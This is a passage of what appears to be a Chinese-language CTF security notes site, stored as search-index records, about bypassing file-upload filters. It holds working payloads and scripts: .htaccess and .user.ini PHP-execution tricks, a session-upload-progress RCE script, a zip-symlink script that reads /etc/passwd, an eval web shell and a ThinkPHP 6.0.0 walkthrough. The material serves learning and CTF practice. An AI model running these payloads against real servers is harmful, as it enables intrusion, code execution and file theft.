<pre><code>AddType application/x-httpd-php .abc #asdf asdf\n</code></pre> <p>\u65b9\u6cd52</p> <p>\u9664\u4e86<code>#</code>\u5916\uff0c<code>0x00</code>\u4e5f\u53ef\u4ee5\u5f53\u6ce8\u91ca\u7b26\uff0c\u4f7f\u7528<code>write.php</code>\u811a\u672c\u5199\u5165.htaccess\uff1a</p> <pre><code>&lt;?php$data = urldecode('AddType application/x-httpd-php .abc%0a%00asdf');file_put_contents('.htaccess', $data);\n</code></pre> <p>\u6d4b\u8bd5\uff1a</p> <p></p>"},{"location":"web/upload/htaccess/#3","title":"3.\u6587\u4ef6\u683c\u5f0f\u68c0\u6d4b","text":"<p>\u5982\u679c\u4f7f\u7528<code>exif_imagetype</code>\u68c0\u6d4b\u4e0a\u4f20\u7684\u6587\u4ef6\u7684\u7b2c\u4e00\u4e2a\u5b57\u8282\u6765\u5224\u65ad\u6587\u4ef6\u7c7b\u578b\uff0c\u90a3\u4e48\u53ea\u8981\u662f\u56fe\u50cf\u683c\u5f0f\u4ee5<code>#</code>\u6216<code>0x00</code>\u5f00\u5934\u4fbf\u53ef\u7ed5\u8fc7</p> <p>\u65b9\u6cd51</p> <p>\u4f7f\u7528XBM\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf(\u9700\u5b89\u88c5GD\u5e93)\uff1a</p> <pre><code>&lt;?php// \u521b\u5efa\u7a7a\u767d\u56fe\u50cf\u5e76\u6dfb\u52a0\u6587\u5b57$im = imagecreatetruecolor(120, 20);$text_color = imagecolorallocate($im, 233, 14, 91);imagestring($im, 1, 5, 5,  'A Simple Text String', $text_color);\n// \u4fdd\u5b58\u56fe\u50cfimagexbm($im, '1.png');\n// \u91ca\u653e\u5185\u5b58imagedestroy($im);?&gt;\n</code></pre> <p>(\u4e0b\u9762\u7684<code>1_png_width</code>\u4ee5\u53ca<code>1_png_height</code>\u662f\u6839\u636e\u6587\u4ef6\u540d\u8fdb\u884c\u62fc\u63a5\u751f\u6210\u7684)</p> <p></p> <p>\u90a3\u4e48\u53ef\u4ee5\u5728.htaccess\u524d\u9762\u52a0\u4e0a\uff1a</p> <pre><code>#define 1_png_width 120#define 1_png_height 20\n</code></pre> <p>\u4fbf\u53ef\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p> <p>\u65b9\u6cd52</p> <p>\u4f7f\u7528WBMP\u56fe\u50cf\uff0c\u4f7f\u7528PHP\u751f\u6210\u56fe\u50cf\uff1a</p> <pre><code>&lt;?php$img = imagecreatetruecolor(20, 20);imagewbmp($img, '1.wbmp');?&gt;\n</code></pre> <p>\u4f7f\u752816\u8fdb\u5236\u7f16\u8f91\u5668\u67e5\u770b\uff1a</p> <p></p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u79cd\u56fe\u50cf\u683c\u5f0f\u662f\u4ee5<code>0x00</code>\u5f00\u5934\u7684\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u6b64\u65b9\u5f0f\u7ed5\u8fc7\u5bf9\u6587\u4ef6\u683c\u5f0f\u7684\u68c0\u6d4b</p>"},{"location":"web/upload/htaccess/#4_1","title":"4.\u5176\u4ed6\u5b57\u7b26\u9650\u5236","text":"<p>\u82e5\u8fc7\u6ee4\u4e86<code>&lt;</code>\u3001\u6570\u5b57\u3001<code>:</code>\u7b49\uff0c\u6b64\u65f6\u4fbf\u4e0d\u80fd\u4f7f\u7528<code>php://filter</code>\u6216\u8005UTF\u7f16\u7801\u7684\u65b9\u5f0f\u7ed5\u8fc7\u4e86\uff1b\u53ef\u5c1d\u8bd5\u5229\u7528.htaccess\u8bbe\u7f6e\u5305\u542b\u6307\u5b9a\u7684\u6587\u4ef6\u3002\u4f8b\u5982\u5bf9\u4e8esession\u6587\u4ef6\uff0c\u53ef\u901a\u8fc7\u5305\u542b\u4e0a\u4f20\u6587\u4ef6\u4ea7\u751f\u7684\u4e34\u65f6session\u8fdb\u884cRCE</p> <p>\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\uff0c\u53d1\u73b0\u5927\u90e8\u5206session\u76f8\u5173\u7684\u914d\u7f6e\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7.htaccess\u4fee\u6539\u7684\uff1a</p> <p></p> <p>\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u4e0d\u77e5\u9053session\u5b58\u50a8\u8def\u5f84\u7684\u60c5\u51b5\u4e0b\uff0c\u901a\u8fc7<code>session.save_path</code>\u6307\u5b9a\u5b58\u50a8\u8def\u5f84\uff0c\u5e76\u4e14\u53ef\u4ee5\u5c06<code>session.upload_progress.cleanup</code>\u8bbe\u7f6e\u4e3aoff\uff0c\u8fd9\u6837\u4fbf\u53ef\u65e0\u9700\u6761\u4ef6\u7ade\u4e89\u6765\u5c06\u4ee3\u7801\u5199\u5230session\u6587\u4ef6\u4e2d\uff0c\u4ece\u800c\u5305\u542brce\uff1b\u7f16\u8f91.htaccess\uff1a</p> <pre><code>php_value auto_append_file \"/tmp/sess_gtfly\"php_value session.save_path \"/tmp\"php_flag session.upload_progress.cleanup off\n</code></pre> <p></p> <p>\u7136\u540e\u8fd0\u884c</p> <pre><code>import requests\nurl='http://127.0.0.1/test.php'\nheaders={    \"Cookie\":'PHPSESSID=gtfly'}\nfiles={    \"upload\":''}\ndata={    \"PHP_SESSION_UPLOAD_PROGRESS\": '''&lt;?php echo system('whoami'); ?&gt;'''     }\nr = requests.session()\nr.post(url,files=files,headers=headers,data=data)\nt = r.get('http://127.0.0.1/test.php',headers=headers)\nprint(t.text)\n</code></pre> <p>\u6210\u529f\u6267\u884c\uff1a</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u6240\u4ee5\u6211\u8fd8\u662fcopy\u4e86\uff0c\u6211\u5199\u4e0d\u6765</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_2","title":"\u89e3\u6790\u6f0f\u6d1e","text":""},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#apache2","title":"apache2","text":"<p>\u591a\u540e\u7f00\u89e3\u6790\u6f0f\u6d1e</p> <ul> <li>\u5728Apache 2.0.x &lt;= 2.0.59\uff0cApache 2.2.x &lt;= 2.2.17\uff0cApache 2.2.2 &lt;= 2.2.8\u4e2dApache \u89e3\u6790\u6587\u4ef6\u7684\u89c4\u5219\u662f\u4ece\u53f3\u5230\u5de6\u5f00\u59cb\u5224\u65ad\u89e3\u6790,\u5982\u679c\u540e\u7f00\u540d\u4e3a\u4e0d\u53ef\u8bc6\u522b\u6587\u4ef6\u89e3\u6790,\u5c31\u518d\u5f80\u5de6\u5224\u65ad\u3002</li> </ul> <p>\u59821.php.abc\uff0c\u56e0apache2\u4e0d\u8bc6\u522b.abc\u540e\u7f00\uff0c\u6240\u4ee5\u5411\u524d\u89e3\u6790php</p> <p>.htaccess</p> <ul> <li>Apache\u63d0\u4f9b\u4e86\u4e00\u79cd\u5f88\u65b9\u4fbf\u7684\u3001\u53ef\u4f5c\u7528\u4e8e\u5f53\u524d\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\u7684\u914d\u7f6e\u6587\u4ef6\u2014\u2014.htaccess\uff08\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\uff09</li> </ul> <p>\u5f53\u7ad9\u70b9\u914d\u7f6e\u4e0a\u6807\u6709AllowOverride All\uff0c\u5e76\u4e14rewrite_mod\u5f00\u542f\u65f6\uff0c.htaccess\u6587\u4ef6\u5c31\u4f1a\u751f\u6548\u3002</p> <p>(1) Options</p> <p>\u5217\u76ee\u5f55</p> <pre><code>Options +Indexes\nPlain Text\n</code></pre> <p>\u53ef\u4ee5\u6267\u884ccgi\u7a0b\u5e8f</p> <pre><code>Options ExecCGI\nPlain Text\n</code></pre> <p>\u89e3\u6790cgi\u7684\u53c2\u8003\u94fe\u63a5https://www.freebuf.com/vuls/218495.html</p> <p>(2) AddType application/x-httpd-php abc</p> <p>\u5f53\u5728.htaccess\u4e2d\u5199\u5165AddType application/x-httpd-php abc\u65f6\uff0c\u5c31\u4f1a\u628a1.abc\u5f53\u4f5cphp\u6587\u4ef6\u89e3\u6790</p> <p>(3) php_value\u3001php_admin</p> <pre><code>php_flag zend.multibyte 1php_value zend.script_encoding \"UTF-7\"php_value auto_append_file .htaccess+ADw?php phpinfo()+Ads\nPlain Text\n</code></pre> <p>UTF-7\u3001UTF-16\u3001UTF-32\u7686\u53ef</p> <p>\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d</p> <pre><code>php_flag engine 0\nPlain Text\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\u8fd8\u53ef\u4ee5\u8fd9\u6837\u4e66\u5199.htaccess</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_3","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u5173\u4e8e\u8fd9\u4e2a\u6211\u81ea\u5df1\u6709\u70b9\u7b14\u8bb0</p> <p>.htaccess\u6587\u4ef6(\u6216\u8005\"\u5206\u5e03\u5f0f\u914d\u7f6e\u6587\u4ef6\"\uff09</p> <p>,\u5168\u79f0\u662fHypertextAccess(\u8d85\u6587\u672c\u5165\u53e3)\u3002\u63d0\u4f9b\u4e86\u9488\u5bf9\u76ee\u5f55\u6539\u53d8\u914d\u7f6e\u7684\u65b9\u6cd5\uff0c \u5373\uff0c\u5728\u4e00\u4e2a\u7279\u5b9a\u7684\u6587\u6863\u76ee\u5f55\u4e2d\u653e\u7f6e\u4e00\u4e2a\u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a\u6307\u4ee4\u7684\u6587\u4ef6\uff0c\u4ee5\u4f5c\u7528\u4e8e\u6b64\u76ee\u5f55\u53ca\u5176\u6240\u6709\u5b50\u76ee\u5f55\u3002\u4f5c\u4e3a\u7528\u6237\uff0c\u6240\u80fd\u4f7f\u7528\u7684\u547d\u4ee4\u53d7\u5230\u9650\u5236\u3002\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7Apache\u7684AllowOverride\u6307\u4ee4\u6765\u8bbe\u7f6e\u3002.htaccess\u662f\u4e00\u4e2a\u7eaf\u6587\u672c\u6587\u4ef6\uff0c\u5b58\u653e\u7740\u4e00\u4e9bapache\u6307\u4ee4\uff0c\u4e0ehttpd.conf\u7c7b\u4f3c\uff0c\u4f46\u4f5c\u7528\u8303\u56f4\u4ec5\u9650\u5f53\u524d\u76ee\u5f55\u3002</p> <p>.htaccess\u662f\u5728\u7528\u6237\u8bbf\u95ee\u8be5\u76ee\u5f55\u4e0b\u7684\u7ad9\u70b9\u65f6\u52a0\u8f7d\u7684\uff0c\u4e0d\u9700\u8981\u91cd\u542fapache\u670d\u52a1\u8fdb\u884c\u8f7d\u5165\uff0c\u66f4\u7075\u6d3b\u4f46\u66f4\u8017\u7cfb\u7edf\u8d44\u6e90\u3002\u7531\u4e8e.htaccess\u53ef\u4ee5\u914d\u7f6e\u5f88\u591a\u4e1c\u897f\uff0c\u5982\u76ee\u5f55\u8bbf\u95ee\u3001\u6587\u4ef6\u6267\u884c\u3001\u9519\u8bef\u9875\u9762\u91cd\u5b9a\u5411\u7b49</p> <p>\u7a0d\u5fae\u4e3e\u4e2a\u4f8b\u5b57\uff1a</p> <p> <p>SetHandlerapplication/x-httpd-php</p> <p>//\u6216\u8005\u5e72\u8106\u4e0d\u8981FilesMatch,\u8fd9\u91cc\u7684\u610f\u601d\u662f\u914d\u7f6e\uff0c\u5982\u679c\u5305\u542b1\uff0c\u5219\u5c06\u5176\u89c6\u4e3aphp\u6587\u4ef6\u6267\u884c</p> <p>\u5728PHP\u4e2d\u6709\u4e2a\u5f88\u6709\u8da3\u7684\u4e1c\u897f\u53eb.user.ini\uff0c\u6709\u70b9\u7c7b\u4f3c.htaccess\u6587\u4ef6\uff0cPHP\u4f1a\u5728\u6bcf\u4e2a\u76ee\u5f55\u4e0b\u626b\u63cfINI\u6587\u4ef6\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7.user.ini\u6587\u4ef6\u6765\u5b9e\u73b0\u9690\u85cf\u540e\u95e8\u7684\u6548\u679c</p> <p>\u5728.user.ini\u4e2d\u53ef\u4ee5\u8bc6\u522bPHP_INI_PERDIR\u548cPHP_INI_USER\u6a21\u5f0f\u7684INI\u8bbe\u7f6e</p> <p>\u5173\u4e8ePHP_INI_*\u4e00\u5171\u6709\u56db\u79cd\uff1a</p> <p>PHP_INI_USER \u53ef\u5728\u7528\u6237\u811a\u672c\u4ee5\u53ca.user.ini\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_PERDIR \u53ef\u5728php.ini\uff0c.htaccess\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_SYSTEM \u53ef\u5728php.ini\u6216httpd.conf\u4e2d\u8bbe\u5b9a</p> <p>PHP_INI_ALL \u53ef\u5728\u4efb\u4f55\u5730\u65b9\u8bbe\u5b9a</p> <p>auto_prepend_file</p> <p>\u8be5\u914d\u7f6e\u9879\u4f1a\u8ba9php\u6587\u4ef6\u5728\u6267\u884c\u524d\u5148\u5305\u542b\u4e00\u4e2a\u6307\u5b9a\u7684\u6587\u4ef6\uff0c\u901a\u8fc7\u8fd9\u4e2a\u914d\u7f6e\u9879\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u6765\u9690\u85cf\u81ea\u5df1\u7684\u540e\u95e8</p> <p>\u5c31\u8fd9\u4e2a\u73a9\u610f\u513f\uff0c\u53ef\u4ee5\u5728\u4e0d\u4e0a\u4f20php\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u5236\u9020\u4e00\u4e2a\u6587\u4ef6\u5305\u542b\u51fa\u6765</p> <p>\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u76f4\u63a5\u8986\u76d6\u6389\u4e86\u7cfb\u7edf\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u8fd9\u79cd\u5371\u5bb3\u8fd8\u662f\u975e\u5e38\u5927\u7684\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_4","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>CVE-2017-15715</p> <ul> <li>\u5229\u7528\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\uff0c\u6587\u4ef6\u540d\u4e4b\u540e\u6dfb\u52a0\u4e00\u4e2a\\x0a\u6765\u7ed5\u8fc7\u9ed1\u540d\u5355\u4e0a\u4f20\u7684\u9650\u5236</li> </ul>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#nginx","title":"nginx","text":"<p>CVE-2013-4547</p> <ul> <li>\u53c2\u8003https://github.com/vulhub/vulhub/tree/master/nginx/CVE-2013-4547</li> </ul> <p>\u5373\u4e0a\u4f20\u4e00\u4e2a1.gif\uff0c\u7136\u540e\u8bbf\u95ee1.gif[0x20][0x00].php([0x20][0x00]\u4e3a\u7a7a\u683c\u548c\\0\u4e0d\u9700\u8981url\u7f16\u7801)\uff0c1.gif\u4f1a\u88ab\u5f53\u4f5cphp\u89e3\u6790</p> <p>php-cgi\u6f0f\u6d1e</p> <ul> <li>\u5728php\u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u5f00\u542f\u4e86cgi.fix_pathinfo\uff0c\u5bfc\u81f4\u56fe\u7247\u9a6c1.jpg\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee1.jpg/.php\u89e3\u6790\u6210php</li> </ul> <p>.user.ini</p> <ul> <li>\u5f53\u4f7f\u7528CGI\uff0fFastCGI \u6765\u89e3\u6790php\u65f6\uff0cphp\u4f1a\u4f18\u5148\u641c\u7d22\u76ee\u5f55\u4e0b\u6240\u6709\u7684.ini\u6587\u4ef6\uff0c\u5e76\u5e94\u7528\u5176\u4e2d\u7684\u914d\u7f6e\u3002\u7c7b\u4f3c\u4e8eapache\u7684.htaccess\uff0c\u4f46\u8bed\u6cd5\u4e0e.htacces\u4e0d\u540c\uff0c\u8bed\u6cd5\u4e0ephp.ini\u4e00\u81f4\u3002\u56e0nginx\u5b9e\u9645\u4e0a\u53ea\u662f\u8d77\u5230\u8f6c\u53d1\u7684\u4f5c\u7528\uff0c\u5b9e\u9645\u89e3\u6790\u4e00\u822c\u4e3aphp-fpm\u6216fastcgi\u6765\u89e3\u6790\uff0c\u6240\u4ee5\u5728.user.ini\u4e2d\u5199\u5982auto_prepend_file=test.jpg\uff0c\u4e4b\u540e\u4e0a\u4f20.user.ini\u4e0etest.jpg\uff0c\u8fc7\u4e00\u6bb5\u65f6\u95f4\u7b49\u5f85.user.ini\u88ab\u52a0\u8f7d\u540e\uff0c\u4f1a\u5bfc\u81f4\u6bcf\u4e2aphp\u6587\u4ef6\u89e3\u6790\u4e4b\u524d\u5148\u5c06test.jpg\u5f53\u4f5cphp\u89e3\u6790\u3002</li> </ul>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#php","title":"php","text":"<p>00\u622a\u65ad</p> <p>php \u7248\u672c\u4e3a5.2.x\uff0c\u5728\u4e0a\u4f20\u6587\u4ef6\u65f6\u5728\u6587\u4ef6\u540e\u540d\u540e\u8ffd\u52a0\\0\u5373\u53ef\u8ba9\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u6700\u7ec8\u53d8\u4e3a\u4ee5.php\u7ed3\u5c3e\u7684\u6587\u4ef6</p> <p>fopen\u7279\u6027</p> <pre><code>&lt;?php$filename='shell.php/.';$content=\"&lt;?php phpinfo();\";$f = fopen($filename, 'w');    fwrite($f, $content);    fclose($f);?&gt; //\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210shell.php\nPlain Text\n</code></pre> <p>\u8fd9\u4e2a\u770b\u8d77\u6765\u597d\u7528\uff0c\u5b9e\u9645\u4e0a\u5012\u6ca1\u6709\u7528\u7684\u90a3\u4e48\u591a\uff0c\u8fd9\u4e2a\u662fphp\u8bed\u8a00\u7684\u89e3\u6790\u6f0f\u6d1e\u3002</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#zip","title":"zip\u8f6f\u94fe\u63a5\u6267\u884c\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6","text":"<pre><code>#coding=utf-8\nimport os\nimport requests\nimport sys\nurl = ''\ndef makezip():\nos.system('ln -s '+sys.argv[1]+' exp')\nos.system('zip --symlinks exp.zip exp')\nmakezip()\nfiles = {'the_file':open('./exp.zip','rb')}\ndef exploit():\nres = requests.post(url,files=files)\nprint(res.text)\nexploit()\nos.system('rm -rf exp')\nos.system('rm -rf exp.zip')\nPlain Text\n</code></pre> <p>\u5148copy\u4e00\u4e0b\u6240\u7528\u5230\u7684\u811a\u672c\u539f\u7406\u4e4b\u540e\u518d\u89e3\u91ca</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#_5","title":"\u6587\u4ef6\u4e0a\u4f20\u8fdb\u9636","text":"<p>\u539f\u7406\u5f88\u7b80\u5355\uff0c\u5229\u7528linux\u91cc\u9762\u7684\u8f6f\u94fe\u63a5\u6765\u94fe\u63a5\u5f53\u524d\u7528\u6237\u4e0b\u7684\u6587\u6863\uff0c\u7136\u540e\u5f53\u6211\u4eec\u8bfb\u53d6\u8bbf\u95ee\u65f6\u4f1a\u663e\u793a\u6587\u4ef6\u4e2d\uff08\u5305\u62ec\u8def\u5f84\u4e2d\u7684\uff09\u5185\u5bb9\uff0c\u76f8\u5f53\u4e8e\u6587\u4ef6\u4e0a\u4f20\u540e\u8fbe\u6210\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u3002</p> <p>\u81f3\u4e8e\u8f6f\u94fe\u63a5\uff0c\u76f4\u63a5\u7406\u89e3\u7c7b\u4f3cwindows\u4e0b\u7684\u5feb\u6377\u65b9\u5f0f\uff0c\u6027\u8d28\u4e0a\u4f1a\u6709\u70b9\u4e0d\u540c</p> <p>\u5e73\u5e38\u7ecf\u5e38\u4f1a\u4f7f\u7528\u7684\u547d\u4ee4\u5c31\u662f</p> <p>ln -s \u8def\u5f84a \u8def\u5f84b\uff0c \u4e5f\u4f1a\u4e00\u822c\u7528\u4e8e\u5c06\u4f60\u81ea\u5b9a\u4e49\u7684\u53ef\u6267\u884c\u6587\u4ef6\u653e\u5230\u7cfb\u7edf\u547d\u4ee4\u4e2d\uff0c\u4e4b\u540e\u6309tab\u53ef\u4ee5\u8865\u5168</p> <p>\u4e0a\u9762\u811a\u672c\u7684\u5229\u7528\u65b9\u5f0f\u4e3a</p> <p>python3 jiaoben /etc/passwd/</p> <p>\u53ef\u4ee5\u8bfb\u53d6\u5230\u8def\u5f84\u5185\u5185\u5bb9</p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E8%BF%9B%E9%98%B6/#thinkphp600-601","title":"Thinkphp6.0.0--6.0.1\u6587\u4ef6\u540d\u4e0a\u4f20\u6f0f\u6d1e","text":"<p>thinkphp\u7684\u6f0f\u6d1e\u611f\u89c9\u786e\u5b9e\u662f\u5f88\u591a\u3002</p> <p>\u7b80\u5355\u7684\u6982\u62ec\u5c31\u662f\u7531\u4e8e\u5b83\u81ea\u5df1\u7684\u4ee3\u7801\u903b\u8f91\u6709\u95ee\u9898\uff0c\u5bfc\u81f4\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u4e0a\u4f20\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u67d0\u4e9b\u7279\u5b9a\u7684\u60c5\u51b5\u4e0b\u53ef\u4ee5\u62ff\u5230shell</p> <p>2020\u5e741\u670810\u65e5\uff0cThinkPHP\u56e2\u961f\u53d1\u5e03\u4e00\u4e2a\u8865\u4e01\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u7531\u4e0d\u5b89\u5168\u7684SessionId\u5bfc\u81f4\u7684\u4efb\u610f\u6587\u4ef6\u64cd\u4f5c\u6f0f\u6d1e\u3002\u8be5\u6f0f\u6d1e\u5141\u8bb8\u653b\u51fb\u8005\u5728\u76ee\u6807\u73af\u5883\u542f\u7528session\u7684\u6761\u4ef6\u4e0b\u521b\u5efa\u4efb\u610f\u6587\u4ef6\u4ee5\u53ca\u5220\u9664\u4efb\u610f\u6587\u4ef6\uff0c\u5728\u7279\u5b9a\u60c5\u51b5\u4e0b\u8fd8\u53ef\u4ee5getshell\u3002</p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p>\u800c<code>$sessionId</code>\u662fcookie\u4e2d\u540d\u4e3aPHPSESSID\u7684\u503c\uff0c\u56e0\u6b64\u662f\u653b\u51fb\u8005\u53ef\u63a7\u7684\uff0c\u4ece\u800c\u5bfc\u81f4\u5199\u5165\u7684\u6587\u4ef6\u540d\u53ef\u63a7\u3002</p> <p>\u539f\u7406\u9898\uff1a</p> <p>[GYCTF2020]EasyThinking</p> <p>\u9996\u5148\u6253\u5f00\u9898\u76ee\u6ce8\u518c\u540e\u5728url\u4e0a\u4e71\u8f93\u4e86\u4e00\u901a\uff1a</p> <p></p> <p>get\u5230\u4e86\u6846\u67b6\u7684\u7248\u672c\uff0c\u76f4\u89c9\u544a\u8bc9\u6211\u4eec\u4e00\u822c\u90fd\u662f\u67d0\u4e2a\u8865\u4e01\u3002\u641c\u5230\u4e86\u4e0a\u9762\u7684thinkphp6.0.0\u7684\u6587\u4ef6\u540d\u4e0a\u4f20\u3002</p> <p>\u7136\u540e\u8fd8\u6709\u4e00\u4e2asearch\u6a21\u5757\uff0c\u76f8\u5f53\u4e8e\u80fd\u591fpost\u6570\u636e\u4e0a\u53bb\u3002</p> <p></p> <p>\u81f3\u4e8e\u4fdd\u5b58\u7684\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e2awww.zip\u53ef\u4ee5\u770b\u5230\u3002</p> <p></p> <p>\u4e0a\u4f20\u6210\u529f\u6b63\u5e38\u60c5\u51b5\u4e0b\u90a3\u5c31\u7528\u8681\u5251\u6765\u8fde\u63a5\uff0c\u8fde\u63a5\u4e4b\u540e\u7684\u754c\u9762\u8fd9\u6837\uff0c\u6709\u4e2a./readflag\uff0c\u4f46\u7531\u4e8e\u662fdisable_function\uff0c\u4e00\u822c\u547d\u4ee4\u90fd\u8fc7\u4e0d\u4e86\u3002</p> <p>\u4e4b\u540e\u7528\u5230ld_preload\u8fdb\u7a0b\u6ce8\u5165\u7684\u7ed5\u8fc7\uff0c\u539f\u7406\u4e4b\u524d\u505a\u679c\u4e00\u4e9b\u603b\u7ed3\uff0c\u8fd9\u91cc\u4e0d\u8d58\u8ff0\uff0c\u76f4\u63a5\u7528\u8681\u5251\u4e0a\u7684\u63d2\u4ef6\u3002</p> <p></p>"},{"location":"web/upload/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%9F%BA%E7%A1%80/","title":"\u6587\u4ef6\u4e0a\u4f20\u57fa\u7840","text":"<p>[\u6781\u5ba2\u5927\u6311\u6218 2019]Upload</p> <p>\u4e0d\u662f\u7279\u522b\u597d\u5199\u5165\u95e8\u7ea7\u7684\u603b\u7ed3\uff0c\u5148\u62ff\u4e2a\u4f8b\u5b50\u6765\u505a\u505a</p> <p></p> <p>\u968f\u4fbf\u62ff\u5f20\u56fe\u7247\u4e0a\u4f20\u6293\u5305\u3002\u4e0a\u4f20\u53d1\u73b0\u4e0d\u6210\u529f\uff08\u6211\u660e\u660e\u62ff\u7684\u662f\u4e00\u5f20\u56fe\u7247\uff09</p> <p>\u90a3\u5c31\u770b\u770b\u5b83\u8fc7\u6ee4\u70b9\u5728\u54ea\u3002</p> <p>\u5f04\u4e2a\u80fd\u4e0a\u4f20\u7684\u6587\u4ef6\u7136\u540e\u4fee\u6539\u4e0a\u4f20\u5185\u5bb9\u4e3a</p> <p></p> <p>\u4f46\u662f\u540e\u7f00\u540d\u4e3ajepg\u80af\u5b9a\u662f\u4e0d\u80fd\u89e3\u6790\u6267\u884c\u7684\uff0c\u4f46\u5c1d\u8bd5php\u4e5f\u4e0d\u884c</p> <p>\u6700\u7ec8\u4e3aphtml\uff1a\u8001\u7248\u672cphp\u7684\u4e00\u79cd\u540e\u7f00\u683c\u5f0f</p> <p>\u4e0a\u4f20\u6728\u9a6c\u6210\u529f</p> <p>\u987a\u4fbf\u63d0\u4e00\u53e5\uff1aGIF89a</p> <p>GIF89a\u56fe\u7247\u5934\u6587\u4ef6\u6b3a\u9a97\uff0c\u662f\u4e00\u79cd\u653b\u51fb\uff0cGIF89a\u56fe\u5f62\u6587\u4ef6\u662f\u4e00\u4e2a\u6839\u636e\u56fe\u5f62\u4ea4\u6362\u683c\u5f0f\uff08GIF\uff0989a\u7248\u8fdb\u884c\u683c\u5f0f\u5316\u4e4b\u540e\u7684\u56fe\u5f62\u3002</p> <p>\u6709\u7684\u670d\u52a1\u5668\u89e3\u6790\u4e0d\u4e00\u5b9a\u662f\u8fd9\u4e2a\u6bd4\u5982\u67d0\u4e9b\u8bc6\u522b\u7684\u662fPNG\u7684\u6587\u4ef6\u5934\uff0c\u4e5f\u5c31\u662f\u90a3\u4e2aGIF89a\u6539\u6210PNG</p> <p>\u6587\u4ef6\u4e0a\u4f20\u7684\u57fa\u672c\u4fee\u6539\u7684\u53c2\u6570\u5c31\u662f\u56fe\u4e2d\u7684</p> <p>filename\u7684\u540e\u7f00</p> <ul> <li> <p>Content-Type\u7684\u683c\u5f0f\uff0c\u4e00\u822c\u4fee\u6539\u4e3aimage/jpeg\uff0c\u89c6\u60c5\u51b5\u800c\u5b9a</p> </li> <li> <p>\u6587\u4ef6\u5934</p> </li> <li> <p>\u4e0a\u4f20\u6570\u636e\u7684\u5185\u5bb9\uff0c\u6bd4\u5982\u8fd9\u9898\u5c31\u8fc7\u6ee4\u4e86\"&lt;?\"\u5bfc\u81f4&lt;?php @eval($_POST(\"aa\"));?&gt;\u7528\u4e0d\u4e86</p> </li> <li> <p>\u7136\u540e\u662f\u731c\u6587\u4ef6\u4e0a\u4f20\u7684\u8def\u5f84\uff08\u4e5f\u53ef\u4ee5\u8def\u5f84\u626b\u63cf\u626b\u540e\u592a\u626b\u51fa\u6765\uff09\uff0c\u6211\u4eec\u8bbf\u95ee\u5b83\uff08\u76f8\u5f53\u4e8e\u8c03\u7528\u5b83\u5f53\u4f5cphp\u6587\u4ef6\u6267\u884c\uff09\u540e\u6253\u5f00\u4e86\u4e00\u4e2a\u53cd\u5f39\u7684shell</p> </li> </ul> <p>\u7136\u540e\u4e0a\u4f20\u7684\u8def\u5f84\u4e00\u822c\u4e3aupload/\u6587\u4ef6\u540d       uploaded/\u6587\u4ef6\u540d</p> 